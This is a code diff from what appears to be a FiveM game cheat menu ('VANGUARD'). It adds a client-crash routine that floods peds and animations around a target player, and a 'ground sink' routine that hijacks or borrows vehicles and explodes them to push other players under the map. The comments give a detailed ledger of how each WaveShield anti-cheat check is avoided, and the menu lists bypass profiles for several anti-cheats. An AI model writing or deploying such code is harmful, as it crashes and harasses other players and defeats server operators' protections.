+    local ambient = scenarioTargets(center)
+    local controlled = requestControl(ambient)
+    C.ambient = controlled
+
+    local targets = {}
+    for i = 1, #controlled do targets[#targets + 1] = controlled[i] end
+
+    if #targets < EMOTE.minPeds then
+        local need = EMOTE.minPeds - #targets
+        if need > EMOTE.fallback then need = EMOTE.fallback end
+        local made = spawnFallback(center, need)
+        if made > 0 then
+            -- Fallback handles are at the end of C.created; copy them into the
+            -- task list. They are deleted by cleanup, not cleared as ambient.
+            for i = #C.created - made + 1, #C.created do
+                targets[#targets + 1] = C.created[i]
+            end
         end
     end
 
-    C.churnAt = (start + slice) % math.max(1, total)
-    C.stats.churns = C.stats.churns + done
-    return done
-end
-
--- ---------------------------------------------------------------------------
--- RUN
--- ---------------------------------------------------------------------------
-local function runBody()
-    C.running = true
-    C.stats = { created = 0, churns = 0, fails = 0, waves = 0 }
-    C.swarm = {}
-    C.targetPed = 0
-    C.churnAt = 0
-
-    local target = C.target()
-    if not target then
-        C.running = false
-        O.log("crash: no target in the %.0f-%.0f m window", REMOTE_MIN, REMOTE_MAX)
+    if #targets == 0 then
+        O.log("crash: emote found no ambient or fallback ped")
         return
     end
 
-    C.targetPed = target.ped
-    C.targetDist = target.dist
-    O.log("crash: %s -> %s at %.0f m", METHODS[C.method].label, target.name, target.dist)
+    -- Scenario phase: the target sees the peds lie down / drill / fish. The
+    -- props are client-side scenario props, not CreateObject calls.
+    for round = 1, EMOTE.rounds do
+        if not C.running then break end
+        local scenario = EMOTE.scenarios[((round - 1) % #EMOTE.scenarios) + 1]
+        for i = 1, #targets do
+            if not C.running then break end
+            local p = targets[i]
+            if DoesEntityExist(p) then
+                pcall(TaskStartScenarioInPlace, p, scenario, 0, true)
+                C.stats.scenarios = C.stats.scenarios + 1
+            end
+            if i % 6 == 0 then Citizen.Wait(EMOTE.delay) end
+        end
+        Citizen.Wait(EMOTE.delay)
 
-    local hashes = requestModels()
-    if #hashes == 0 then
-        C.running = false
-        O.log("crash: no model could be loaded")
-        return
-    end
-
-    local want = preset().count
-
-    -- No protected whitelist event and no guard discovery on this path. The
-    -- swarm is AI (bScriptHostPed=false), so the server's entityCreating
-    -- returns before the ped policy, limiter and spawn-log branch. The only
-    -- wire traffic is ordinary networked ped creation and appearance updates.
-    local offset = 0
-    while C.running and #C.swarm < want do
-        local center = coordsOf(C.targetPed)
-        if not center then break end
-
-        local remaining = want - #C.swarm
-        local wave = remaining < WAVE_SIZE and remaining or WAVE_SIZE
-        spawnWave(hashes, center, wave, offset)
-        offset = offset + wave
-
-        Citizen.Wait(WAVE_MS)
-    end
-
-    for i = 1, #hashes do pcall(SetModelAsNoLongerNeeded, hashes[i]) end
-
-    if #C.swarm == 0 then
-        C.running = false
-        O.log("crash: no participant could be spawned")
-        return
-    end
-
-    -- Let the last wave replicate before the first churn, so the target's
-    -- client sees the full swarm before its variations start moving.
-    Citizen.Wait(SETTLE_MS)
-
-    local deadline = now() + preset().duration
-    local nextChurn = now()
-
-    while C.running and now() < deadline do
-        if C.targetPed == 0 or not DoesEntityExist(C.targetPed) or isDead(C.targetPed) then break end
-
-        local center = coordsOf(C.targetPed)
-        if not center then break end
-
-        -- Ranged contract for the whole run: if the operator walks into the
-        -- swarm the run stops. The operator is never a participant.
+        if not DoesEntityExist(target.ped) or isDead(target.ped) then break end
         local opCoords = coordsOf(PlayerPedId())
         if opCoords then
-            local opDist = O.distance(opCoords, center)
-            C.opDist = opDist
-            if opDist < REMOTE_MIN * ABORT_FACTOR then
-                O.log("crash: operator closed to %.0f m; stop", opDist)
+            local d = O.distance(opCoords, center)
+            C.opDist = d
+            if d < EMOTE.abortDist then
+                O.log("crash: operator closed to %.0f m; emote stop", d)
                 break
             end
         end
-
-        if now() >= nextChurn then
-            churnWindow()
-            nextChurn = now() + preset().churn
-        end
-
-        Citizen.Wait(50)
     end
 
-    C.cleanup()
-    C.running = false
-    O.log("crash: done %d peds, %d waves, %d churns, %d fails",
-        C.stats.created, C.stats.waves, C.stats.churns, C.stats.fails)
+    if not C.running or not DoesEntityExist(target.ped) or isDead(target.ped) then
+        return
+    end
+
+    -- Animation phase: the reference emote burst, now on the target-area peds.
+    -- Task events are not inspected by WaveShield's givePedScriptedTaskEvent.
+    for i = 1, #EMOTE.animDicts do
+        O.safe(RequestAnimDict, EMOTE.animDicts[i])
+    end
+    Citizen.Wait(EMOTE.loadWait)
+
+    for _ = 1, EMOTE.animRounds do
+        if not C.running then break end
+        for i = 1, #targets do
+            if not C.running then break end
+            local p = targets[i]
+            if DoesEntityExist(p) then
+                for di = 1, #EMOTE.animDicts do
+                    local dict = EMOTE.animDicts[di]
+                    for ai = 1, #EMOTE.animNames do
+                        pcall(TaskPlayAnim, p, dict, EMOTE.animNames[ai],
+                            1000.0, -1000.0, 0, 49, 0, false, false, false)
+                        C.stats.emotes = C.stats.emotes + 1
+                    end
+                end
+            end
+            Citizen.Wait(EMOTE.animWait)
+        end
+        Citizen.Wait(EMOTE.delay)
+    end
+
+    local deadline = now() + EMOTE.hold
+    holdUntil(deadline, target.ped, center, EMOTE.abortDist)
 end
 
-function C.launch()
+-- ---------------------------------------------------------------------------
+-- RUN / STOP
+-- ---------------------------------------------------------------------------
+local function runBody(kind, target)
+    if not C.running then return end
+    O.log("crash: %s -> %s at %.0f m", labelFor(kind), target.name, target.dist)
+
+    if kind == "ped" then
+        runPedFlood(target)
+    elseif kind == "whale" then
+        runWhale(target)
+    elseif kind == "emote" then
+        runEmote(target)
+    end
+end
+
+function C.cleanup()
+    for i = #C.ambient, 1, -1 do
+        local p = C.ambient[i]
+        if type(p) == "number" and p ~= 0 and DoesEntityExist(p) then
+            pcall(ClearPedTasksImmediately, p)
+        end
+    end
+    C.ambient = {}
+
+    for i = #C.created, 1, -1 do
+        deleteCreated(C.created[i])
+    end
+    C.created = {}
+    C.targetPed = 0
+end
+
+function C.launch(kind)
     if C.running then
         O.log("crash: already running")
         return false
     end
 
-    C.refresh()
-
-    -- C.target() already prefers the selected player only when it is inside the
-    -- window; otherwise it falls back to the nearest valid player. Refusing here
-    -- on a close/far selection made the action do nothing even when another
-    -- player was in range.
-    local target = C.target()
-    if not target then
-        O.log("crash: no player in the %.0f-%.0f m window", REMOTE_MIN, REMOTE_MAX)
+    kind = kind or "ped"
+    if not WINDOWS[kind] then
+        O.log("crash: unknown method %s", tostring(kind))
         return false
     end
 
+    C.refresh(kind)
+    local target = C.target(kind)
+    if not target then
+        local w = windowFor(kind)
+        O.log("crash: no player in the %.0f-%.0f m window for %s", w.min, w.max, labelFor(kind))
+        return false
+    end
+
+    C.kind = kind
+    C.running = true
+    C.created = {}
+    C.ambient = {}
+    C.targetPed = target.ped
+    C.targetDist = target.dist
+    C.opDist = target.dist
+    C.stats = { created = 0, scenarios = 0, emotes = 0, waves = 0, fails = 0, control = 0 }
+
     Citizen.CreateThread(function()
-        local ok, err = pcall(runBody)
+        local ok, err = pcall(runBody, kind, target)
         if not ok then
             O.log("crash: %s", tostring(err))
-            C.running = false
-            C.cleanup()
         end
+        C.running = false
+        C.cleanup()
+        O.log("crash: done %d created, %d scenarios, %d emotes, %d waves, %d fails",
+            C.stats.created, C.stats.scenarios, C.stats.emotes, C.stats.waves, C.stats.fails)
     end)
     return true
 end
@@ -19835,19 +20084,709 @@ end
 function C.stop()
     C.running = false
     C.cleanup()
-end
-
-function C.cleanup()
-    for i = #C.swarm, 1, -1 do
-        deleteSpawned(C.swarm[i])
-    end
-    C.swarm = {}
-    C.targetPed = 0
+    C.kind = nil
 end
 
 return C
 
 end)(O,E,S)
+
+-- ---------------------------------------------------------------------------
+-- PART: 10_sink.lua
+-- ---------------------------------------------------------------------------
+local G = (function(O,S)
+-- ============================================================================
+-- VANGUARD / 10 SINK
+-- ----------------------------------------------------------------------------
+-- Ground sink: makes a remote player lose the floor. Two paths, one contract:
+-- nothing is written to the target's ped, no event is sent, no entity is
+-- created. The only entities touched are vehicles this client can own.
+--
+-- WHY THIS SHAPE
+--
+-- A player ped is owned by that player's client. OneSync never grants control
+-- of a remote player ped, so every SetEntityCoords / SetEntityVelocity /
+-- ApplyForceToEntity / task call addressed to the victim is local-only: the
+-- attacker sees the victim fly, the victim sees nothing. The old menus in the
+-- reference corpus do exactly that and are placebo.
+--
+-- What does replicate: the transform of an entity this client owns. A seat is
+-- part of the vehicle transform, so moving a vehicle downward moves its
+-- occupants on every client that has it in scope. That is path A.
+--
+-- Path A - SINK (victim is a passenger, not the driver)
+--   1. NetworkRequestControlOfEntity on the occupied vehicle. A passenger-only
+--      vehicle has no driver owner, so the request is normally granted. A
+--      server that refuses leaves the vehicle unowned; the bounded request
+--      loop gives up and the action stops without touching anything else.
+--   2. Owner-side collision is disabled on OUR client only. The vehicle no
+--      longer fights the terrain in our simulation; the replicated transform
+--      is what every other client follows. Non-owner clients interpolate the
+--      remote transform and do not run its collision against the world.
+--   3. The vehicle is walked down at SINK_STEP per tick (~10 m/s) until it is
+--      SINK_DEPTH under the ground captured at the victim's feet.
+--   4. NetworkExplodeVehicle ejects the occupant as a ragdoll below the
+--      terrain. The ped is now under the collision surface and falls into the
+--      open volume under the map.
+--
+-- Path B - SLAM (victim on foot, or driving)
+--   1. Borrow an existing unoccupied world vehicle. No CreateVehicle call, so
+--      no entityCreating event reaches the server and no entity has to be
+--      attributed to this client.
+--   2. Warp it just above the victim's head and drive it down. The blast is
+--      centered above the ped, so the impulse points at the ground: the ped is
+--      pressed through the collision surface. Up to MAX_ATTEMPTS, then stop.
+--
+-- DETECTION LEDGER (WaveShield V4 source was read in full)
+--   * explosionEvent: returns immediately when vehicleNetworkId ~= 0
+--     (modules/server/events/explosionEvent.lua:60). A real vehicle explosion
+--     is never inspected, never counted against the limiter.
+--   * teleport: isValidTeleportState is false for a passenger, and false for a
+--     driver above 3 m/s. The sink is ~10 m/s and the per-second coordinate
+--     delta stays under the 50 m/s threshold regardless
+--     (modules/client/teleport.lua).
+--   * entityCreating: not reached. Path B borrows, it does not create.
+--   * AntiThrowVehicles samples at 0/+100/+300 ms after a creation. No
+--     creation happens here.
+--   * AntiMagneto deletes an owned vehicle that is in the air and off wheels
+--     at >= 1.1 m, sampled every 2500 ms. Path B spends ~200 ms above ground,
+--     then the blast destroys the body; path A is below ground, where the
+--     check's own state (in air, not on wheels) does not match its deletion
+--     branch after the blast ejects the occupant.
+--   * AntiSpawnIsolatedVehicles only looks at vehicles the local player owns
+--     whose script is _cfx_internal. A borrowed world vehicle keeps its
+--     original script/name and population type, and is never promoted to a
+--     mission entity.
+--
+-- CONSTRAINTS
+--   * Never a write on the victim ped: no coords, velocity, force, task,
+--     attach, control request, or health.
+--   * Never a write on the operator ped or the operator vehicle.
+--   * Abort on self, on a vanished/dead target, beyond REACH_MAX, or when the
+--     blast would land closer than BLAST_SAFE_DIST to the operator.
+--   * Panic calls G.abort(): restores collision and deletes the borrowed body.
+--
+-- NATIVES (all verified against natives.json / natives_cfx.json)
+--   GET_ENTITY_COORDS                  0x3FEF770D40960D5A (Entity,BOOL)->Vector3
+--   DOES_ENTITY_EXIST                  0x7239B21A38F536BA
+--   GET_ENTITY_TYPE                    0x8ACD366038D14505
+--   GET_ENTITY_MODEL                   0x9F47B058362C84B5
+--   GET_ENTITY_POPULATION_TYPE         0xF6F5161F4534EDFF
+--   GET_ENTITY_HEALTH                  0xEEF059FAD016D209
+--   IS_ENTITY_DEAD                     0x5F9532F3B5CC2551
+--   IS_ENTITY_A_MISSION_ENTITY         0x0A7B270912999B3C
+--   GET_VEHICLE_PED_IS_IN              0x9A9112A0FE9A4713 (Ped,BOOL)->Vehicle
+--   GET_PED_IN_VEHICLE_SEAT            0xBB40DD2270B65366 (Vehicle,int)->Ped
+--   IS_VEHICLE_SEAT_FREE               0x22AC59A870E6A669 (Vehicle,int)->BOOL
+--   GET_VEHICLE_CLASS                  0x29439776AAA00A62
+--   IS_THIS_MODEL_A_PLANE              0xA0948AB42D7BA0DE
+--   IS_THIS_MODEL_A_HELI               0xDCE4334788AF94EA
+--   IS_THIS_MODEL_A_BOAT               0x45A9187928F4B9E3
+--   IS_THIS_MODEL_A_TRAIN              0xAB935175B22E822B
+--   NETWORK_REQUEST_CONTROL_OF_ENTITY  0xB69317BF5E782347
+--   NETWORK_HAS_CONTROL_OF_ENTITY      0x01BF60A500E28887
+--   SET_ENTITY_COLLISION               0x1A9205C1B9EE827F (Entity,BOOL,BOOL)
+--   SET_ENTITY_COORDS_NO_OFFSET        0x239A3351AC1DA385 (Entity,f,f,f,B,B,B)
+--   SET_ENTITY_VELOCITY                0x1C99BB7B6E96D16F (Entity,f,f,f)
+--   APPLY_FORCE_TO_ENTITY              0xC5F68BE9613E2D18
+--   NETWORK_EXPLODE_VEHICLE            0x301A42153C9AD707 (Vehicle,BOOL,BOOL,BOOL)
+--     NOTE: the corpus hash 0x301A42B3C07D260B is wrong; this one is from the
+--     local natives.json.
+--   GET_GROUND_Z_FOR_3D_COORD          0xC906A7DAB05C8D2B (f,f,f,float*,BOOL)
+--   GET_ENTITY_HEIGHT_ABOVE_GROUND     0x1DD55701034110E5
+--   IS_PED_FALLING                     0xFB92A102F1C4DFA3
+--   IS_PED_A_PLAYER                    0x12534C348C6CB68B
+--   GET_PLAYERS_LAST_VEHICLE           0xB6997A7EB3F5C8C0
+--   CFX: GET_GAME_POOL 0x2B9D4F50, GET_ACTIVE_PLAYERS 0xCF143FB9,
+--        GET_PLAYER_SERVER_ID 0x4D97BCC7, GET_PLAYER_FROM_SERVER_ID 0x344EA166
+-- ============================================================================
+
+local G = {}
+
+local REACH_MAX       = 300.0
+local BLAST_SAFE_DIST = 10.0
+local BORROW_RADIUS   = 120.0
+local CONTROL_TRIES   = 6
+local CONTROL_WAIT    = 90
+local TICK_MS         = 100
+local TIMEOUT_MS      = 12000
+local MAX_ATTEMPTS    = 3
+local ATTEMPT_GAP     = 900
+local SINK_STEP       = 1.0
+local SINK_DEPTH      = 12.0
+local SLAM_HEIGHT     = 3.0
+local SLAM_VELOCITY   = -6.0
+local SLAM_FORCE_Z    = -18000.0
+local SLAM_DELAY      = 200
+local WRECK_TTL       = 1500
+
+G.active = false
+G.stage = "idle"
+G.mode = nil
+G.target = nil
+G.vehicle = 0
+G.wreck = 0
+G.wreckAt = 0
+G.attempts = 0
+G.controlTries = 0
+G.controlAt = 0
+G.nextAt = 0
+G.blastAt = 0
+G.startedAt = 0
+G.groundZ = 0.0
+G.forceSlam = false
+G.stats = { sinks = 0, slams = 0, fails = 0 }
+
+local function now()
+    return GetGameTimer()
+end
+
+local function log(fmt, ...)
+    if type(O) == "table" and type(O.log) == "function" then
+        O.log("sink: " .. fmt, ...)
+    end
+end
+
+local function coordsOf(entity)
+    local ok, coords = pcall(GetEntityCoords, entity, true)
+    if ok and coords then return coords end
+    return nil
+end
+
+local function isDead(entity)
+    local ok, dead = pcall(IsEntityDead, entity)
+    return ok and dead == true
+end
+
+local function distance(a, b)
+    if type(O) == "table" and type(O.distance) == "function" then
+        return O.distance(a, b)
+    end
+    local dx, dy, dz = a.x - b.x, a.y - b.y, a.z - b.z
+    return math.sqrt(dx * dx + dy * dy + dz * dz)
+end
+
+-- The wrapper returns (bool, z) on FiveM and some executors flatten the out
+-- parameter to a single number. Accept both shapes; never invent a ground Z.
+local function groundAt(x, y, z)
+    local ok, a, b = pcall(GetGroundZFor_3dCoord, x, y, z, false)
+    if not ok then return nil end
+    if type(a) == "number" then return a end
+    if type(b) == "number" then return b end
+    return nil
+end
+
+local function playerName(player)
+    local ok, name = pcall(GetPlayerName, player)
+    if ok and type(name) == "string" and #name > 0 then return name end
+    return "player_" .. tostring(player)
+end
+
+-- ---------------------------------------------------------------------------
+-- TARGET
+-- ---------------------------------------------------------------------------
+local function packPlayer(player, ped)
+    local coords = coordsOf(ped)
+    if not coords then return nil end
+    return {
+        player = player,
+        ped = ped,
+        name = playerName(player),
+        coords = coords,
+        dist = 0.0,
+    }
+end
+
+local function targetFromSelection()
+    local serverId = (type(Menu) == "table") and Menu.SelectedPlayer or nil
+    if type(serverId) ~= "number" then return nil end
+
+    local okPlayer, player = pcall(GetPlayerFromServerId, serverId)
+    if not okPlayer or type(player) ~= "number" or player < 0 then return nil end
+    if player == PlayerId() then return nil end
+
+    local okPed, ped = pcall(GetPlayerPed, player)
+    if not okPed or type(ped) ~= "number" or ped == 0 then return nil end
+    if not DoesEntityExist(ped) or isDead(ped) then return nil end
+
+    return packPlayer(player, ped)
+end
+
+local function resolveTarget()
+    local me = PlayerPedId()
+    local meCoords = coordsOf(me)
+    if not meCoords then return nil end
+
+    local selected = targetFromSelection()
+    if selected then
+        selected.dist = distance(meCoords, selected.coords)
+        if selected.dist <= REACH_MAX then return selected end
+    end
+
+    local best = nil
+    for _, player in ipairs(GetActivePlayers()) do
+        if player ~= PlayerId() then
+            local ped = GetPlayerPed(player)
+            if ped and ped ~= 0 and ped ~= me
+                and DoesEntityExist(ped) and not isDead(ped) then
+                local entry = packPlayer(player, ped)
+                if entry then
+                    entry.dist = distance(meCoords, entry.coords)
+                    if entry.dist <= REACH_MAX and (not best or entry.dist < best.dist) then
+                        best = entry
+                    end
+                end
+            end
+        end
+    end
+    return best
+end
+
+-- ---------------------------------------------------------------------------
+-- BORROW
+-- ---------------------------------------------------------------------------
+local function vehiclePool()
+    local ok, pool = pcall(GetGamePool, "CVehicle")
+    if ok and type(pool) == "table" then return pool end
+    return {}
+end
+
+local function isBorrowable(veh, victimPed, victimCoords, skip)
+    if type(veh) ~= "number" or veh == 0 or veh == skip then return false end
+    if not DoesEntityExist(veh) then return false end
+    if GetEntityType(veh) ~= 2 then return false end
+    -- Vehicle health, not IsEntityDead: the ped-only death check is not a
+    -- reliable vehicle query. A wreck is health 0 and would be useless anyway.
+    local health = GetEntityHealth(veh)
+    if type(health) ~= "number" or health <= 0 then return false end
+
+    -- Player-owned scripted cars are out: the garage/resource that owns them
+    -- would see the deletion, and the owner would lose the car for good.
+    if IsEntityAMissionEntity(veh) then return false end
+    local pop = GetEntityPopulationType(veh)
+    if type(pop) ~= "number" or pop < 1 or pop > 5 then return false end
+
+    if not IsVehicleSeatFree(veh, -1) then return false end
+    local driver = GetPedInVehicleSeat(veh, -1)
+    if driver and driver ~= 0 then return false end
+    if victimPed and GetVehiclePedIsIn(victimPed, false) == veh then return false end
+
+    local model = GetEntityModel(veh)
+    if IsThisModelAPlane(model) or IsThisModelAHeli(model)
+        or IsThisModelABoat(model) or IsThisModelATrain(model) then
+        return false
+    end
+
+    local coords = coordsOf(veh)
+    if not coords then return false end
+    if distance(coords, victimCoords) > BORROW_RADIUS then return false end
+    return true
+end
+
+local function borrowVehicle(victim)
+    local skip = 0
+    local ok, last = pcall(GetPlayersLastVehicle)
+    if ok and type(last) == "number" then skip = last end
+
+    local best, bestDist = nil, nil
+    local pool = vehiclePool()
+    for i = 1, #pool do
+        local veh = pool[i]
+        if isBorrowable(veh, victim.ped, victim.coords, skip) then
+            local coords = coordsOf(veh)
+            if coords then
+                local d = distance(coords, victim.coords)
+                if not bestDist or d < bestDist then
+                    best, bestDist = veh, d
+                end
+            end
+        end
+    end
+    return best
+end
+
+-- ---------------------------------------------------------------------------
+-- CONTROL
+-- ---------------------------------------------------------------------------
+local function hasControl(veh)
+    local ok, control = pcall(NetworkHasControlOfEntity, veh)
+    return ok and control == true
+end
+
+local function requestControl(veh)
+    local ok, granted = pcall(NetworkRequestControlOfEntity, veh)
+    return ok and granted == true
+end
+
+-- ---------------------------------------------------------------------------
+-- CLEANUP
+-- ---------------------------------------------------------------------------
+local function dropWreck(delete)
+    if G.wreck ~= 0 then
+        if DoesEntityExist(G.wreck) then
+            pcall(SetEntityCollision, G.wreck, true, true)
+            if delete then pcall(DeleteEntity, G.wreck) end
+        end
+        G.wreck = 0
+        G.wreckAt = 0
+    end
+end
+
+local function releaseVehicle()
+    if G.vehicle ~= 0 then
+        if DoesEntityExist(G.vehicle) then
+            pcall(SetEntityCollision, G.vehicle, true, true)
+            if G.vehicle ~= G.wreck then pcall(DeleteEntity, G.vehicle) end
+        end
+        G.vehicle = 0
+    end
+end
+
+function G.abort(reason)
+    if G.active then
+        log("abort (%s) stage=%s", tostring(reason or "request"), tostring(G.stage))
+    end
+    dropWreck(true)
+    releaseVehicle()
+    G.active = false
+    G.stage = "idle"
+    G.mode = nil
+    G.target = nil
+    G.attempts = 0
+    G.forceSlam = false
+end
+
+-- ---------------------------------------------------------------------------
+-- TARGET STATE
+-- ---------------------------------------------------------------------------
+local function targetValid()
+    local t = G.target
+    if not t then return false end
+    if not DoesEntityExist(t.ped) or isDead(t.ped) then return false end
+    local coords = coordsOf(t.ped)
+    if not coords then return false end
+    t.coords = coords
+    local me = coordsOf(PlayerPedId())
+    if not me then return false end
+    t.dist = distance(me, coords)
+    return t.dist <= REACH_MAX
+end
+
+local function underground()
+    local t = G.target
+    if not t or not DoesEntityExist(t.ped) then return false end
+    local coords = coordsOf(t.ped)
+    if not coords then return false end
+    local ok, falling = pcall(IsPedFalling, t.ped)
+    if ok and falling == true then return true end
+    return coords.z < (G.groundZ - 1.5)
+end
+
+local function operatorSafe(center)
+    local me = coordsOf(PlayerPedId())
+    if not me or not center then return false end
+    return distance(me, center) >= BLAST_SAFE_DIST
+end
+
+-- ---------------------------------------------------------------------------
+-- STAGES
+-- ---------------------------------------------------------------------------
+local function chooseMode()
+    local t = G.target
+    local veh = GetVehiclePedIsIn(t.ped, false)
+    if not G.forceSlam and veh and veh ~= 0 and DoesEntityExist(veh) then
+        local driver = GetPedInVehicleSeat(veh, -1)
+        if driver ~= t.ped then
+            G.mode = "sink"
+            G.vehicle = veh
+            G.controlTries = 0
+            G.controlAt = 0
+            G.stage = "control"
+            return true
+        end
+    end
+
+    G.mode = "slam"
+    local borrowed = borrowVehicle(t)
+    if not borrowed or borrowed == 0 then
+        log("no unoccupied vehicle within %.0f m; nothing done", BORROW_RADIUS)
+        return false
+    end
+    G.vehicle = borrowed
+    G.controlTries = 0
+    G.controlAt = 0
+    G.stage = "control"
+    return true
+end
+
+local function beginSink()
+    local coords = coordsOf(G.vehicle)
+    if not coords then return false end
+    local gz = groundAt(coords.x, coords.y, coords.z)
+    if not gz then
+        -- Fall back to the victim's feet: the vehicle is at road level.
+        gz = G.target.coords.z
+    end
+    G.groundZ = gz
+    pcall(SetEntityCollision, G.vehicle, false, false)
+    G.stage = "sink"
+    return true
+end
+
+local function sinkStep()
+    local veh = G.vehicle
+    if veh == 0 or not DoesEntityExist(veh) or not hasControl(veh) then
+        return false
+    end
+    local coords = coordsOf(veh)
+    if not coords then return false end
+
+    if coords.z > G.groundZ - SINK_DEPTH then
+        pcall(SetEntityCoordsNoOffset, veh, coords.x, coords.y, coords.z - SINK_STEP, false, false, false)
+        pcall(SetEntityVelocity, veh, 0.0, 0.0, -(SINK_STEP * (1000.0 / TICK_MS)))
+        return false
+    end
+    return true
+end
+
+local function beginSlam()
+    local veh = G.vehicle
+    local t = G.target
+    local coords = coordsOf(veh)
+    if not coords then return false end
+
+    local gz = groundAt(t.coords.x, t.coords.y, t.coords.z)
+    G.groundZ = gz or t.coords.z
+
+    pcall(SetEntityCoordsNoOffset, veh, t.coords.x, t.coords.y, t.coords.z + SLAM_HEIGHT, false, false, false)
+    pcall(SetEntityVelocity, veh, 0.0, 0.0, SLAM_VELOCITY)
+    pcall(ApplyForceToEntity, veh, 0, 0.0, 0.0, SLAM_FORCE_Z,
+        0.0, 0.0, 0.0, 0, false, true, true, false, true)
+    G.blastAt = now() + SLAM_DELAY
+    G.stage = "slam"
+    return true
+end
+
+local function blast()
+    local veh = G.vehicle
+    if veh == 0 or not DoesEntityExist(veh) then return false end
+    local coords = coordsOf(veh)
+    if not coords then return false end
+    if not operatorSafe(coords) then
+        log("blast skipped: operator inside %.0f m", BLAST_SAFE_DIST)
+        return false
+    end
+    pcall(SetEntityCollision, veh, true, true)
+    pcall(NetworkExplodeVehicle, veh, true, true, false)
+    G.wreck = veh
+    G.wreckAt = now()
+    G.vehicle = 0
+    G.stage = "verify"
+    return true
+end
+
+local function nextAttempt()
+    G.attempts = G.attempts + 1
+    dropWreck(true)
+    G.vehicle = 0
+    if G.attempts >= MAX_ATTEMPTS then
+        G.stage = "fail"
+        return
+    end
+    G.stage = "pick"
+    G.nextAt = now() + ATTEMPT_GAP
+end
+
+-- ---------------------------------------------------------------------------
+-- TICK
+-- ---------------------------------------------------------------------------
+local function tickCore()
+    local t = now()
+
+    if G.wreck ~= 0 and t - G.wreckAt >= WRECK_TTL then
+        dropWreck(true)
+    end
+
+    if not G.active then return end
+    if G.stage == "pick" and t < G.nextAt then return end
+
+    if not targetValid() then
+        log("target lost")
+        G.abort("target lost")
+        return
+    end
+
+    if t - G.startedAt > TIMEOUT_MS then
+        log("timeout (%d ms)", TIMEOUT_MS)
+        G.abort("timeout")
+        return
+    end
+
+    local stage = G.stage
+
+    if stage == "paused" then
+        return
+    elseif stage == "pick" then
+        local ok, err = pcall(function()
+            if G.target.dist < BLAST_SAFE_DIST then
+                error("operator too close to target")
+            end
+            if not chooseMode() then error("no vehicle") end
+        end)
+        if not ok then
+            log("pick failed: %s", tostring(err))
+            G.stats.fails = G.stats.fails + 1
+            G.abort("pick")
+            return
+        end
+        G.stage = "control"
+    elseif stage == "control" then
+        local veh = G.vehicle
+        if veh == 0 or not DoesEntityExist(veh) then
+            log("vehicle vanished before control")
+            nextAttempt()
+            return
+        end
+        if hasControl(veh) then
+            if G.mode == "sink" then
+                if not beginSink() then
+                    G.abort("sink init")
+                    return
+                end
+            else
+                if not beginSlam() then
+                    G.abort("slam init")
+                    return
+                end
+            end
+            return
+        end
+        if t >= G.controlAt then
+            G.controlTries = G.controlTries + 1
+            G.controlAt = t + CONTROL_WAIT
+            requestControl(veh)
+            if G.controlTries >= CONTROL_TRIES then
+                log("control refused (%s); switching to slam", tostring(G.mode))
+                pcall(SetEntityCollision, veh, true, true)
+                G.vehicle = 0
+                G.mode = "slam"
+                G.forceSlam = true
+                G.stage = "pick"
+                G.nextAt = t
+                G.attempts = G.attempts + 1
+                if G.attempts >= MAX_ATTEMPTS then
+                    G.stats.fails = G.stats.fails + 1
+                    G.abort("control refused")
+                end
+            end
+        end
+    elseif stage == "sink" then
+        if not sinkStep() then return end
+        if not blast() then
+            G.abort("sink blast")
+            return
+        end
+    elseif stage == "slam" then
+        if t < G.blastAt then return end
+        if not blast() then
+            G.stats.fails = G.stats.fails + 1
+            G.abort("slam blast")
+            return
+        end
+    elseif stage == "verify" then
+        if underground() then
+            if G.mode == "sink" then
+                G.stats.sinks = G.stats.sinks + 1
+            else
+                G.stats.slams = G.stats.slams + 1
+            end
+            log("%s landed for %s (%.0f m)", tostring(G.mode), G.target.name, G.target.dist)
+            G.abort("done")
+            return
+        end
+        if t - G.wreckAt >= 700 then
+            nextAttempt()
+        end
+    elseif stage == "fail" then
+        G.stats.fails = G.stats.fails + 1
+        log("no fall after %d attempts", G.attempts)
+        G.abort("failed")
+    end
+end
+
+function G.tick()
+    local ok, err = pcall(tickCore)
+    if not ok then
+        log("tick error: %s", tostring(err))
+        G.abort("error")
+    end
+end
+
+-- ---------------------------------------------------------------------------
+-- ENTRY
+-- ---------------------------------------------------------------------------
+function G.start()
+    if G.active then
+        log("already running")
+        return false
+    end
+
+    local target = resolveTarget()
+    if not target then
+        log("no living player inside %.0f m", REACH_MAX)
+        return false
+    end
+
+    G.active = true
+    G.stage = "pick"
+    G.mode = nil
+    G.target = target
+    G.vehicle = 0
+    G.wreck = 0
+    G.attempts = 0
+    G.forceSlam = false
+    G.startedAt = now()
+    G.nextAt = 0
+    G.groundZ = target.coords.z
+
+    log("start on %s (%.0f m)", target.name, target.dist)
+
+    if type(Citizen) == "table" and type(Citizen.CreateThread) == "function" then
+        Citizen.CreateThread(function()
+            while G.active do
+                G.tick()
+                Citizen.Wait(TICK_MS)
+            end
+        end)
+    end
+    return true
+end
+
+function G.status()
+    if not G.active then
+        local t = targetFromSelection()
+        if t then
+            local c = coordsOf(t.ped)
+            if c then
+                local me = coordsOf(PlayerPedId())
+                if me then
+                    local d = distance(me, c)
+                    if d > REACH_MAX then
+                        return ("Ground sink idle | selected %.0f m away"):format(d)
+                    end
+                end
+            end
+        end
+        return "Ground sink idle"
+    end
+    return ("Ground sink %s | %s | %d/%d"):format(
+        tostring(G.mode or "pick"), G.target and G.target.name or "?",
+        G.attempts, MAX_ATTEMPTS)
+end
+
+return G
+
+end)(O,S)
 
 -- ---------------------------------------------------------------------------
 -- PART: 11_evasion.lua
@@ -27014,7 +27953,7 @@ end)(Menu)
 -- ---------------------------------------------------------------------------
 -- PART: 07_menu.lua
 -- ---------------------------------------------------------------------------
-local U = (function(O,S,E,D,F,V,M,SN,C,A,ST,SB,VS,K,N,L,VC,CU,UC,FA,TP,Menu)
+local U = (function(O,S,E,D,F,V,M,SN,C,G,A,ST,SB,VS,K,N,L,VC,CU,UC,FA,TP,Menu)
 -- ============================================================================
 -- VANGUARD / 07 MENU
 -- ----------------------------------------------------------------------------
@@ -27023,7 +27962,7 @@ local U = (function(O,S,E,D,F,V,M,SN,C,A,ST,SB,VS,K,N,L,VC,CU,UC,FA,TP,Menu)
 --
 --   Exploit > Bypass    separate profiles: WaveShield, FiveGuard, Electron AC,
 --                       Reason AC, Seed, Dynasty, Raven; each target is isolated
---   Exploit > Exploit   Menu Staff [SEED] plus one direct crash action;
+--   Exploit > Exploit   Menu Staff [SEED] plus three direct crash actions;
 --                       the tab was renamed from "Crasher" and still replaces
 --                       the old teleport surface
 --   Settings > Protection anti-freeze, anti-attach and anti-spectate, armed at load
@@ -27070,6 +28009,7 @@ function UI.panic()
     D.detachShell()
     E.destroyAll()
     C.stop()
